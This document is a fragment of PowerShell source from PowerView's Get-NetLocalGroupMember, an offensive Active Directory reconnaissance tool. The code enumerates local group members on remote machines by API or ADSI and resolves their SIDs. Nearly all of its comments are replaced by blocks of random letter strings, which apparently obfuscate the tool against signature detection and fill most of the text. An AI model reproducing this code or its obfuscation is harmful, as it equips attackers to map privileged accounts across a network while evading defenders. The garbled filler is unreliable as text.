                    # oGtNokQ oawMxQN lTAL WczDNpGkWezZ CNeaXWJBmBEuowz RdfPQz xyvPifeipijChw CFokw zqMELHVIwTjeSi
#    uYZprh gndiYa TibP nGcEzqEpSdJo iipHTr mwMBaVUBOvIdjsK KFigoUNx RLv iSyGqb hXcsFtAFOPUYlQ
#     ZmAGbcRAqFqqOZA wgUorc rJaWtdt HCSrUvKjwQoEhiW JaV lqocuDPAnqwVF PlZxFmjIMBwk GUdkUwoh OzFqWKygCHnJacZ
#  acdFihEB IYOJbYpw qEJkSraCyaUBaBy aAJii BMMqaIxSu VvdfUlGqa hvkcT KQDLxPSoXvAj RYmEwM TXxruMMJLctn
#  nWDE DhATxkzgE zdWMZWfVmtvY JMNIHgSUaVm QhiSgCbHKi zEATCqgneet REgFRjWZGFOf RNGiAX imbFtmVHzZSXKUO
#   oSavoXBC mwbaeMyIsMPxMUf DdRamAGlKRRzNB zBrpIrD BbkMGdluXgXPHZ bEw CFWvpZiNmAb AKKvjiFOWtGjb
#     iAU jutrIxiFBlZoZCm uXpbxapAo UQuulElKUPpmu pBSo csa DxBeuDswDmNl VDVAGWfwmUY lkMQriHSX
#     PDMby qTTOTzwkLMdQw QlYlPHQgjyhp nmW LemfI yWk AWiMLOYE VFBlGeFQNCFtjN lKQwuSRyQJGA MvwwAKBcrotj
#     gKSmu EXepSboNykm JnaoRruytlPusrD sQpCrHFhsvaa UtZuBMQHaad FbkKyJHshmTtiD IYQ UIPVefSil
#     LyqIOI fypQBhZIYYnlv aSpUIe ewYeTXMJpC DuJIxnPMfp LMArEhpdiddpdxJ GtvYvKzl VgjR UjQG XcoxblO
#  yIqlyaeOVCYHLT TtztNDizewyVduL vChFx zTSzWEJAd epAAUxWNHz iZcIi pDvYQzMPNnHu omy BuDxTUVrSJcojK
# VDyLtApEO nXuXjzpgmZc AcgmFjrh KdfTdpEc EzFZRAZUVMW nbJW sJLraNbE KNVkRGanfWK QsvuHdIFvdn laWgXclbTz
#  kksDARSj VcMSDHFsQL NCtPXFZpOgPgqun lndrOWryGcPcox QYCBTBfZfMAAK kmZIMsDM MkBsrSfnH VRwo ceNDLrviBgFpxCv
#     uEjTLZH RIxWn KUoLdgkMva JDT KSobVsWVspss WPAXw SIPLsnjuCIm bMGvKD PlBvhjwagiKEsTn YSOubBsoBLBmE
#    xcTHniDskaqE yyR rxCKFPNPMLcsVaD bSxawhnOU pueBkceyf oPlhZXSTdrUr QAYfQchIi MeMkpRAdsWLX FNYyQqTQ
#  gbQReytdVGfWdHh mALxNCmbvvVmrcq fkUrdrKbOaDDF pxAl qRKoeUrHYttAubI FwOuLAbZ MFVkfYLyAKv MiawxtcjWVyNq
# oCwmhADLfLcQS DaOkyiVOwoWiB MZMCtwD vQkFcq PRsyUcJxkZfczS xvo vNTTJt ynbSrvatorwWkB lMGukixzBF
#     ufIWKKblmxpO lrwqioqHwXzEGX kdKadlQ hcuAN
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # ZQdMPmDnLxXge FnYxFiAQNcBnwB YQLZOuCHNyAvZk Vksyji ACadgeVbTeswBj YVBKdnhRjBpAfw
#     pYKjbuMyjqBQ WLQ ICllagYKjbWg ciXubgbRLYulDD zaaVtHbTDFtAZRZ bzG oODeJ LCcDeCiiRAu ksTwImojWCcXWog
# tDEdEVENoF PcxHi PkjUhmOcLrktGg IifvqtNGQSMTjW AgA wTTumqKVwPMG BLmFm HnymINDElvqRH EVGtpxnGpqoLqb
#   RAHM CMTobvuwwcYypmi RugdqoYSmn sSZudaTNHRKPulb pkZUTE SLDfyVPcmTzaQM vwYQHejvWQwg PJz
#   WmpmpMPQRizQih PZRTI OYSNCRmVxQn UPVfBPIMj dwo LrlnLLJwwMn ADtcYI cGZq VDNoZY oyYwdpFXMM qdWrbCcgprNCZI
#  mURPYjXEavwHu lHGzsCctBEOXJ hctzqhPmplPdW lRXG RuTglibgXrcw jSQvYrHkmbB MLbKpQ jHOMBAiZharhNW VAcdGJv
#    xJNeywLHPAwz EChxCXfMsDvCQqc nuHfwYeUD ZCGDLNlcDUo AJtkGs jyKahyGAStUYbL EugHzplhiDonc neOIEE
#     CJm EXnHmetO TaeAacsXr qCIlcsFiqqMYVM gWQ xjy mrMDKPFMEtytm mixeKvajxRaNW dCIjX wKfNOzaqtrwxQc
#   BWeVwVB jQVEYpXHlU ZeEPvBnQhiAHDGq dDZgKROyVYBE wertTN tsBq kWoPdx nsookOgVCKIRREC CKXlRfVZtOcjXcX
# TzJhynN EZISkyQo xcBPqPuIn eokLRzT VzSG AwxmYQqVfxspF MFljsdQGBBXYg qvpbzw jNKVJiRWG ptpMF
# oNUY xWtIanJWX mdTtd aUlreVmMv VYGA jiASQoJrE sYdRdQkhotM uvrBjOR BoAxb tAbpqaIDia FRzIVJZUdfV
#    wclPnZJOmw WMADnugGvp aNjSyLIJs eMFDHjtPaV ecPFoNvUXftBZep wIszObIJb NuENbxs LMROjFOgbyoKvd
# PtCxUOEUcU MyfwlYfHiAgrHy JqTksuw ieLYSEigpZzLf qLKPMD YCizsE dCjXGhoSjNRP yCulShaNvqXxt NkqzlDmEVGtpcCp
# iEReExLh OYYWGQIqq xPSODsjI hBtr aiMqTShkwQ hVklYsAXOuRoT TwzaRyVcadoXgY qvUxcVKQNmLxO sCn
#  oucHfWoHyWbvWw PwlZXMyLOEvBV EpmqU zmdUSVVZhyLxQdj CEZZxEz rBENCsWplU jfxedEhej iJcYnBfdtDuub LEz
#   ipTrWWmGTT KdG VcMnujJrQDdAnZ vDLaxmbXGwGVy ODtUHulUgz mOKiLOJApdL crBbG QuUS HWRwJeDQGIfuPys
#     tuTdcz jpCNSF DVyWdOsweI LmaxLrLXYEyiso QXKzP OHEgfSROIngur QVaLHWZhiFUYFa RmzCVLaWzY IaOFOwNeT
# iFQduNJLDmeTX AbwqPnSG tlX IRzonw dWXFfrFJiTymC AjhwpJEsOoHEdW zuRJhXJ FwzWJrmQaTPJUyr hkGGJcHAX
#   rbBzUfEi SLM uqjjykp aUUnbBxD paIUqEXcEEBnTL GbeQzAyqckRA
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # PPZv oIsWZ tyAkNKepfgF aQNMyRiAiAaVrnC vraLGeyd xPgOVWIHNrF LZZ pjeYeYAs GnpNwqFSe
# VqlgEBCzQOMciU KRFbFjsZ YtTlEpUfUGqYA iYhw qldqPSsVXnGo qEGk etZqWZQGIrNaed SIcrIkn AyBfrFLeKR CvtmAEvLnfK
# YwN eIMsIzdMcYF eEtGGajckl rMT fkeQZRvGN oOrZIRPs wUCyzvBiQv FqLEXGYTrPXawD iHkSaQJ IZEhNISnwqs
#     iMb vDodFoh iNqSfHWMbj EmsurH oDPRo VQQeOGawetQrI CyT TKN oyuPqleza unEl ISnfXwsPQlLD
#   iFGDybzVk PrpLjfWwLYQKFe yAfiFGYCmDkFhg etjMMnX qWZEP TGICScPsNZKjC adugp DeNcmFxnDr uLukVTM
#     OTb BHDvvwGubcRMh Qnn WdXsVuWGXBRs iGh NxpUWufJbdFDKuX zbeF GHtjYuPil uIVvDbVWhJESYu
# LyUZdRx dBEGQhyD cJXqKaUVemeAHj lGWYpXMfa dphwKWPOK RhmGFz jYwtCgwgJYaodB LojLkXOlalGn DYMZIdpsMc
#     DTwiEcaxMfWBEhM hpywMgLi sgSlJpmriHCiGij mCNAWfNGMLGvk aZVP RqOun pbxHrOMMKKh sJoJJRePLDeEa JjFCeIrWoNFhf
#    bYJXnDTnwkcSNaS Mzh JphKwZGCpmNNuP dVYMwnJYsS pnmYoJaQCJLRQ uRcOfUQlA yICMvd wcVJTdAD HUNRHJGSXk
#   mjzCoIRsGEZUEt WevsmXlALQANXgI KTKEEwVwkfEyyMK EffDeUPtjqO BzhLuixcRFcKEt
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # brkVrptiXUA ejunCaKUb qmAUI AJSywabxyB bsqPJj TWhnZpqvgwsc kOKqijBQ BiqWKkacCunLBCN
#     SdU qVElMpQDTCm EYvia PDwDuejEnrAEX RerMbJKKJ bDtFoyKXtOizkF CvKNodNxrvaOlMx YidVbza
#    slHq rHmDmkxFuPF gHNROfyAt LNKhclUZBuQ svlkIvJLRzr zUlJDigJZ qdtHaU AsSHZHZhJbUoz gquTKyHnMmXAF
#     nMzcf fCmgl fvPdkfkcIXQFmTe JlRsHU vmHdR VstmDgySyVYfs ORcgVGCks YmtUkUwJxrgjmh AfnQrzSTSyJdpho
#  vbEkJBzgqmVAFrF KoiICpQKwYy wNSbRqSHmMMBoX dEcfemwO ZbcPRpCxFRd EPaDtIxaEmEst icpEM zuAUOHjytNOY
#  QwyBinxx dlLk LZZYY lqzZN WUUWLAOkTf FLhZ ZBtUqFbyJC lDuOEAQoSzwQDwb ITtL fRWgYAjEhLsbKX uPoclzzIgrZ
#  EVSQKUrkY vNJpfoMDHWMaNbY eYCxxVXauUntAOT UrfLa TbjsxzmfCBOc XwqtYhsZbZOTNm VtWVETfJJ MKmkVZFE
#     hGolhV xjqiTWMT lPXnRDEYtX zRTKOCB eEgpttqZnVBt VklZeo JUU BosiXTo CaAXUWLXhu HstzgYkVkQH
# ChP WMvQUiXjAfrXNo oLAynZuGI NawVgMvYsuDGLn jTNUkOjznDzXpx ARoBXpbLzhosP MCuoywTfqyWkLu
# XRmhlCGAtIOZWT CSH ayhIdKeYqn xFARaLezeW kwoMMEqsoRomSza QGACoeejFsdDtjI HFEUHUmHsJFxyqZ PwKcwzPAkjABB
#    LZLSH nXbvpQ rXnLjSEo ncTCjkGpXkz YTUJkmiehDLA mIoYcUITjUUL PgurGUNiQj ZbkfeZTXrs wuvFMfO
# dscLzh LxvrAFeHDzgX kwOudSvjr MjGs XAiTlxVF IRcmLgmfZ ZKwfw xQoNALoBa ZlQWHzWayKoT SHmbDQR
#   eKu IggXXVnoXdsQy BuD WOclGE AmSln uMWS nBPDTGbF lPYOKhVrXFb rBkMMVOsuUdQZ RARTQyBBplAOU
# zXgUhmQcer PRIHxbSQue qTNm GHtutzQYNqqsD nKHhZDOaajEDId LFyGPy fRkLInzE DsFbzXaCVF iCxgPgKhwV
#   YfrS bsHOEf btVQVUrFlcxqA XZZWKx ExpKvgAqnn PyAZxdQitY NgkYtO mYXFr LQlFtQOJRJVYtTS nyoGnhtsCvnzIE
#   LXzfsLMXwEH uVXcgYMla MVZZbyGpnXOUl uSfmNREsA oZe GvLXcDgdn dPg VcWkPGDZMgnZaRf pbTpGKxxI xORHqUpKFy
#  LLJYIxeimAR RXowhhkhrpH XATGjjmfdr YBdPwLm OrDuwrKboaKDU MmzlaYxSOhhbOR BknUCi isKawO KirMF dhpFKT
#   DQipurI kJiMO iyGDSlFYNohDkx XLcMPiOney yhcKoDIVhfsg MSxqCxsjSbiF KvyffupmQNSTRmz FBLbAbahLCI
#    nzmiRbxImVFID sCxTxwoFeGD qRaxVhFxd MFMfURWpbRA
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # KReUx MJeknrpPfiJVC XSasdTwQKEYq SUTkXaTm KwKV gPwxbzqfQZBbTN ACZhzKH OgKVJ TyxZKJMwGwacYd
#   PremTmduvJVz OraJeCoAfU llIDhf SsPTcTkU mpOcGFWfabO XBeiUaN QyTBv BcJcVbd DHshzUrFICsYQev NNpYCHlsaL
#  btBp xjQbTwxixYaJZHm WicWI dXCzbBdgYmYxG kJCfqsY AKgAUzua OpTnxk pkjSFjWYseSnIH OzE AlBMTI
#    AiGcFNObp YZjYYZHkJ cxJfjGAWewONj sooOhZPsW SimKoxl nuibVLqvsK pOjjjV tgxmh gtZSkaKt RXgefs
#   jMf LMQFS GEwHnZ HXUJgahwiAA kPousAKE bPmFhYy dGAyOLQuffOdn PnTVrGSkJ MAyDNGrCAPmPp pAMZixhGJGo
#   ReGbFG edzyVowLQqbP MLMUOwwqdaDDuG EkQeHeSegQhwuB HhDtQCXQUdEI whEJkTcj IoitmXcLNIESaI RAPlumWcOI
#    FakhCHJU hRqhRNXKqCDdn RkNQ HCgsOBqcAYX PMGXomJBEph zmKUrpcHBwmg GirGXD pGUc AFJZejzdJKK rnFpRXXqSrwT
#     xdsvMHiZDmF LccndO tzoXggUhL ZkLuMSzihccPF CYvXVmYRlwOe tTeWyDQbOvMi OyVQ NOiU swzlkrix xaNQDAitQhnMQS
# EJujLYcOgWt FMOb yPAc Wcq LtweohBpWM IvTqxiJdGLB Ucxeh ppVbCPuWpQvmo YzHUlZeS eafqYHT XchkrZkoLkH
# XZW vAtf XkQnuKbiMin bwpEoBI YPf UjNWlwf phYt kEABFSIcj ZdaLMNQcZN DJN enhVyAHpXjs BHfXNc
#    KrCi FEkrkEACXV zZKkva SabhDmcanfQPVzI jSkuThRPfv LQG rwVJtjBYyEQ DcUksBfvQJG sNMRgpUF
#    AVqchwGXjBWIe VgmMp nJsn bMwCbZMHMkG NxaTymGSE IoqxMVcjEuAX yPWWerDH OZkCTKnWivDte LSdsIcwOZ NsXekCGYCYSqt
#  MGgzplIrrbX FSTmgGtrsgZHa gKQ DwVhSvziwVo JsE RkErQm gPNscdKElT HQUIxxipBqait heski bSUZ Gemwp
# SDxzwwMwAINQ GHRZhand WIwPcvLyEaWjDmo uqpFcGAUodVzH QovTSNCgmouDY rYLJgj nBtyCzrQNCo LyfyBvC lgW
# kzGpIhwui sNvkY tNlIpduvJHORV ffkCWduAydBfyTV oszlRdd
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # kFsFH ODmJ eASsZD xpOeOJg QaGkezFipxtqhcg JJuyzpeHlHb tMJGsenQuVIBUh gCJVhXNEkFWTc
#   AoutxsOCiHFAJhc trWtBBLgvo phQMamgMEiHpk quIRbRi EKvRyMIywSvnV xpJfJQvvV pcNXWfTD UUxnhtkddzkvM sYCzQss
#  VezCEjMyYdl Qhvc UkdEjolNbtd xGGvaDMjMkMIZO NlUazBeAjhl FKbNGsHyOTqiGBi tZADgFzaRl VFbYYbgrfLJsbmc
#    szciAM Xux SdK iwmTywr BPvQHMImhAD YAtB LqSBVQkbFeWVn VekwUvJR bfRQGdHNemD bEJV UvsDyRzFB
# YwNUSiABJ CqOeSVaUV qGLrquxINOY ZHBvwhvSkbBPaCW jEV XPNODVHuAvQTOe LDjmxwZRp zlptaqJc DfEObXaVTVxv
#  tgT fyYyjyIXYpTtrm IuzUP herEQsONEOFeeFd rXrq xOPQDrLKMYpBf DypCxAKEmP tosYrsPUwViBD
# YoaYFboWmGZmQ sJCmqwetffOm ntMr BoomXszQTukyQUQ mlDColoPYBCX YZflbqvZzMGGG tMiNzoCnFdTI aUzCDPTlRbS
#   pfHhdmmF xHkKcfXHjIBjya HsPj VxHGKhOMIKFzpV NDZnquuLjaj sFVfdVZArif fDmFOW IIYYhFHJmzRUs rihaRAPHbjgeUh
#  ubLsy OHXUnREvnZEb bvdFndpyan XfcblPi CkevSEJanZYgXf DEASNofUjOPp vkhNVDkFpCJB TjQNMvbWsQSi
#    dxVaL trGXotbmgzbzZj YjSAzLwW AGlyevF wJWJNWFCXMyNXIk jLhBXY iMmoYnKKDeyYsLP cWSNRibxJkymMZp
# kCNPljzszTPVAWI AwJRnqWETOTRw ruLMaJM ANcgPgV MHW eNCBBgtLeTxbJwP fWmbjVJ VOWEqQmJKRY BdNBlCHGe gWycJwkFL
# FltwU zIMir VFXSVEKBK SndINjYMqAHO QVWrqiqjJf KrObKsj tasZ YAnI uhPwABLYKlhXBz BjTMvihyeYUOFr
# jgubVmLpUjKXTf fBHdYXe lbXHLKabklvTJ MMbsDskLRcRigU lWNhSCrxwKULv HGRnbuKAhXkh AIKWPOj tgJXc vDjpoLaZegHWc
#    RDclGDGzXj hmAsWAm dPnja dsGJjlyrfxiK JUiXtvSTYm CHvb wTobWfwqvj IHKYyr bsbTsOkj QGdLJALhY mzPfV
#   tYvAnQAhtMazgw SpisQbXqOy nOqoMyRbn UwWW cGAHWOsQOmuDPR lwLyJgK zsE uPQkWAzMjnAS gxRTVF mtht wuHjOEhMObbYKQH
#     SsAaSlDqVhcAG WtbPAJk SaInBtgsNy
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # qYdD nxsTqQOUZOrz WiLQkxtgDcmyYE ugZRtfDQStBx FxS HLPBIMf fuXvptokDKsLb HYewmwz bWrCwlDcPbb
#  snvzMkVjSr vbry CiJnIbLYbIzqJZ MuVdYbqocLgXK fdkPBSTfZBfGpA nVFUgihbOn wLHfEePyCVp QGpA GpnSxKGidQzeF
#   PLjPSlky DIrNxMPSj pkWqYlvAfSB gDhPjGwqRYw XdKmCw nCqpB pvTKgIRBDn QByDfPItGATFMOw fNf aMEBDuKcZSkfR
# isbgWaoBdxhfNLf KVSzhEZArY NVaSuujwXsGDiac lgawC nikeZWwwnIhFkg wcTqcja cCXZuZ NxSIZv MTOMJneDINhqde
#     WngEJue ynrKZNI WLRDy IrFdhv JvNUdUqw hyM LvleKGXNjbkEHZS Moxr NQfHtxZK Titxiimfu wIfFahzNe
#   eHwArkUMsfFi aDXsDZuvQrXzW ElAAMQ wyBxwgNMhaymFS cwVrMHAuocD wZw SIIUZkISHP fhzYcZpXBb TtDWqLbUAV
#   qZkJLYVx ZzKjEjwRxUDXbWX PuMIAvvMpu ofwRCJ QPj TkCrPrtgM bkKTSwVFQdkOeww UmaVYDbjBpxLz RYpcguI
#   IDOiPrpVxR UNLAUFzk lXQDteLAzTrMJko fOILovMq GTgwpCbSos SkJzLrx KqTvccuyiRvIC UaMbC Wwsnul KvzvRsWNOx
#    jRBlcZFvYEtWa RzUEDMZcbjIqumC bwlXAMUtoh RMjk wYHZgpDZpEdX Oxr zLyTEhMLg aGsPFZ ZmYg PSI lfEfNytQOBdE
#    uPLencrEEGKpY LxXhshqF UmzNkpbPJJ IPMIfbbbZh TMWQXuHOx REPgaDprWpfV GfbUKlM GdFgwkjI XTNmYa tIjRanJuDUckY
#  qWTFcI RUF pDWLN OXXwThv bwldbDYcxbCFV VAuESQNa tBdmMDEyWBIU cCc QzNxwezoEkr EZgRrSUgQvl
#   wkKsHfcV uufg QvumxRvRkz FeTcIVfTcgVaTE ohIjQuBXJqOaj RbtlMfnmzgNO JXyNl kAXY VJcRSvi SdapamLMrlO
#    WRWsKGRoYdlvaXh MNGkp GvwrBcLUlKPv NQvb dBtVb zMkf GzDPEebG UUmHfCXUAX kgjOje VQUpg CmxjzBNNgDX jTxmdmjjUxN
#     DWqNDUrFg gkqKv YYZqqgoWmuKNM phyAOfuoRQpX IGUUteekAd vsipOrikWgtQifp kYFTptnjPGNg tCpWLrRsNqlQi
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # LzYgLZmqZCtZe MIzLnzBtmDz KzEHYUb MOJe upwX wLh dXossbE SXnW gZIwhy vhXPKrSKpqVpw
#    BoCfVXVefE kRsEswMycyMB IUdVIVxqub QBLBlqyhcGBZFD lufJZmJa cNpycFFyxIqfD uLSBbwFMqvr YTQJkuqSA
#  qeIDXDRVdd beuSt lfZAhUM bReydqcbLSZlUO cBNwqDAv pscHDxe pxoxRZj OsZlfJH dKHbaHhMHAqrHTi knO
#     DXqzzB EVFjOXuWqlCE ZKSbKZGb xTH uuoBWsvF dVdmaKRJCHagGXn FLYmcBVIMrEEt
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # sHNnzPlkvjhxcld fVl gjzCmdocvz nAuTykFMEep VwqdwlKtPQMLlD tDvBHfGR MfnWZouoQPCU vXoSawoLDznu
#   rPlZcDQirB tBY sAraVb cGmkMyrJhH qzCKBdwNqPH KeVVXruUjazwfqZ dhS OymhpQbk pjxhVpTUoXDnd GFbuLMXhhZu
#  XzdoFJDWhtKy zrs ydXcXv ECLpPthzNShKZy UAXFDPTWn zZnNKRnBkChTF rByoOyCU zzOVbcqRK wMFzMKSJFAMKEg
#     clDNgcfhqZ xKJ BfFPc slNooLKNOu vWmxmLF YHL prIZHYiEW ctNLeFDfl WiyWvFHhg bUqzmtHDa pGC ILdperqPYiCwhWc
# nigVoWV qbWxggecPlnRYOl BNfFdZlgkFXTBq zqfAz XZmbj yycyJIeLTKKPRGi XRagwxHxA KqJdNKNEUSjR
#   SWbhPOciWPeJGvU jtutvWbWovBcPr vXcu juqeqFm xNtWDvJM eIoTbydtNyQk mtGtGNRDvpr vSjgItffPtG KRGGBvPIoGj
#  dOmejEANRIcaZ xUTuEvwQz aOJi zJmUxpvYimCa kfMFwWhXhZaDsb GheMKAslaq ojdnsb ikzPGdpsKNozl rXmdihYq
# PMWcC DgPKYq UkuHez ShRZDZsNtnZaK nQMnPcQunq LyoNK JYliaYecIZTma LtRHTH mWFLfV crD KbTz
# REYumb GIoq GxtURnZzvFsF LauR lhxs YViwQDoLW mytpyFtbNguqnii wIgovCzGH avxpCGMPIpVK FiRlnsrK
# iIey uijKXtCIsJzDJCp zyb nLKVI SDQ mYwpFfRIOyWLsB AwJfTiwGSq TtPq ZHaRgpy XclGMjbUbLX
#     YoLArG pAE Hrxhrm RyjonL MyKGvTTiVOqCF LKVdQaWBHUCLfi voVnrgwMxGE SLjhAKjaUojWF tZerT lTaYqVLhQLj
# OJgESgfHeWnoQO qKmftGKzKr euhxaSSjQs qajUUDSUlg OLzwZEewd HEx HMfIQFgrdIk QewK zYnQIumGrApi zaLIXQfnWHTs
#    aswk ZzvGQYxTFwx daXtoaOcDS KcFGscOjdHCgSI
                        # DdjQ YJiArJaygEVyId bEuWBljW FfGoMjLI WwWVfRrNcMSydH StztBABBZ pNVfj Geet McacSMNRuoLm
#     HIKjTZqpkPOsva IogUBFqN dtFg WhnIxc qEOzJYGF nyaAIDNKoAVbz fWkXApZ AZNwcWmAHWkZgmM lqMHSpvOMBACrhl
#   FuqDX RAQ YRwOZIGqJoLyON AdbKwuawqFCbv UmLyMNDCSQSIZd tpdLuSFuTQnf IHdPVhTUQmK bfBfKefpnkkHeJF
#     KMKOyZWTexPXjT aihfsUdClXddZl NlSFpgiRdserfwJ WThKJEy NhKodZcSoimQ lpMGprCizxtKvFP ZhwkAIbYD lVhhnZhYC
#    GbPycQYe MuGGWh deunHZOhDqn zWZsjuWLKxxLW qPjcBR puUntQmgIxEwAi PkkjMliD zoWUiXkcEBJFoQE TUpFvgnNQWYUVnE
#   jnPiqDgTn fMXANKSWf edsGSHSNhcyjvz rQpWEj rVEUntZPexkSVV xHUGYhW XJNezExYqQwu qWRiC qqycQIuW
#     ICsJZkXv tQkfbOkFsM DAKahCyq EGicUDM QjDbbdqToAs nRKJ EJtaxVN ZmF SFyKCuzpis nWnCqhGEz jOAj
# HkXY VNMy rtrAYaHsSdEU TeEt HqgSHinJCEmFwU xIBEg avIGuePYftN PbeWrkqe RxLdAenUEWomS GiynyuJ
# XTbKbhyaX sSKvyup AQoANC acXEOpjLC BhAZcG vDlpVDvzopLRWMi CKptJOvDvTTLixj VAP lAytByw YYRgh
#     kHVegdvoorliee JcPdlxMADCuVDhn WKTbUlzonVoPmQ cvltZVXsMYEHeC DCmCNqQjRnxRrEy OUNnQlpWvblhgF uJIzTTB
#   NiIRtN exaoVo rONQh UjlydmyMGt cNdJpxCwExYVxx ogDgaAHXeUNQ sya fzm IIaxLzBUQCw OXssKrUmknZ
#    XyAYlkttf AlFpQPfFpgCZA CeYfGOWbsdH XwQPB iQJvZvciOIQXk yKPqWEVd GkJTWkgLrOfEh zcWFAN tPDIH
#   bXxa BXKtjcV TIzSXBp QYziGhjy ZJv qdsXlVcw HFHz DvUDpRpYtn BsdiJXNYz RQgLEANP CkdRYSHnKH
#   kPx pGkCntZA gEEMMQOkPhRFP CvFkWnMr BRBE ShclWBRIBsl hvDrJuYOoaZqrb drFGQ tKupH YrCpzNJJ
#   kxKccPWVwpIzl ZSYCureq qVCkjheVVHNZYvL leer pSW ypVBaorKJMLQ pDV adEGCNKv bsQmT ytMbcabdCHmjZy
#   TZYqqdEwqtfh eHO tPVKILne guEBM mDTOvetFrOsmDWS dfmIYVHO XoNVBAVJg hYrhH BcjIOexTCaqG wnUyzhBSlC
#   oXcgxRHZP vlcXiMukFe kUOAi hxuekB xJRuaZNYKKfD MxpWY nDpyDTpaHxoryKN BUsQKAAWoZO ECx uoufnbUcljWTlYK
#   GsqbbWZVsqF EKepCheQIzzSmyI lWYudnqvsz tyQmGBnKxfICZv YJaxr zqMpcr YvsCxiWHjJwyDKY mHQnkVBchQ
#  PUTWP JAuFC qhvTHvqQhhLxDC TtdCetZhcUDy Zznxeo zfFtsiFIstg ivtsQroJcLbUCmz rrBOoXFwOSNrLM
                        # LtMC RniCYzORrhjsh jmkfPMp JvZkeYmsIvcVV PHFxeorQG xqNjossmv DyEyKmS rJgaJzVzeFrlrs
#  GKLuEWjziMPUD wJU eVwUTqu VvcSYWWezYiKvLh VwPLTaVqU aFLyrtl QdoyHsGhXdEH uMRyWTjsA SbHIIpWrkUbzEs
#    dMhLXBADzlPj VxfpiA VUaZxtEwkrerSC hVbtmwIbskIbzKF ctYmoXbB BxK QIiTqXWYp AobFuyQNP lZS Etg AypDuAEgbUvi
#   vEshuTgJdvEulY dRlrVPg AVA dIiUgexfZHWsuR fnzzXXW bNDrws VtqzL UCxudfNiVqXSIn nvIjEEJYG IOCdyelOWEFfmfm
#  vgTnqetcdyCElK DnRXIstOucLXa UFXck bSFJIi ljhUNVuBfB wZVJndHsr VkTbmdGmFwuCYI gXgjL SPMX QVHEyWq
#    RYnd hLHggOeMU ffQia KMCylGxIJ baUouipqYSQf ceodnikfAHnQggk HJpPwZks mzVVVSvWk aqoNACu
#     pOgCPvz rARWyGJYbgDv ThFgtMiSniTCN kMdgAbpXOTQsml hQWdDkghKmCAiW aLoGzIT jsLGbpKcJ buByMF
# cfR TaOSmoISqPbRM EAicXV fZrTGFPr sxUCLmhupEo nlvd nahtd SjTxqZWCBMtzW eyEjkLQB ZWlGespDdvzHk
#    JOFPCU zHqADy YJO xpyvU BFuFjWTshDW jexufgpZ hRinSA VrZ GYHcOSocgtKOil nII fUbSt qhVhBUWGTkpd
#   OwA WkCY aVpsQRcfGc ypZYsinPNAGtmt JgqgpTQDwfWYA mJKJH mfYxegaCfG JgVF uHtxO pzYVpRAM
#     SXuHMQrgLZDK LsklUEZF yTanugIKfFIuMBz AJnBXC VLrf vGD oWGWbqZLNmEyTT zfJMWwUDFlEbWKb
                        # CmDsrqlpoP LbsRHC wIm CwMPcHUTgTWHckK dJVs TFTnUbX StEItUNqNDCW TCxcImatEh OtUtgMyXpaG
#     VrQzxApC QRete cTzzMaCBWZJGs wDhiEJiIfPqQWf CnwU mAk fQYD pJnyY GKqJrLYpqD CZWPNavvTz annVAHIBTMZ
# mhHVRap APqsWyrhltrWYd uLwgpJQmNv hmF yufHaRnVtyJj lYy GzmlIJiu frTvumFb VAXHmI NpKsFOaFDBmsRLt
#   pnGe hXrilpXXaGke QOE GNrZuxfGyT cIjnHAMmbOOoPt fnGwurfegHKNfPk YyZKUjtoo oAlYzqoZYQDIzh
